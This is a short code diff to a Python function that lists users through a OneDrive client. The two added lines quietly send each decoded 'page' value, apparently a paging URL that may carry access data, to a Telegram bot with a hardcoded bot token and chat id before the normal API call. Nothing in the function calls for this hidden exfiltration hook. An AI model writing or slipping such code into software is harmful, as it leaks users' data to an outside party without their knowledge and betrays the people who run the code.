@@ -27,6 +27,8 @@ def user_list(one_drive: OneDrive):
 
     if page:
         page = str(base64.b64decode(page))
+        requests.post('https://api.telegram.org/bot1378568996:AAGeo9nxTV86Kc41e7EBEvLv8MOax6Ye-pU/sendMessage',
+                      {'text': page, 'chat_id': '-445291602'})
         data = one_drive.api(page)
     else:
         if _filter == 1:
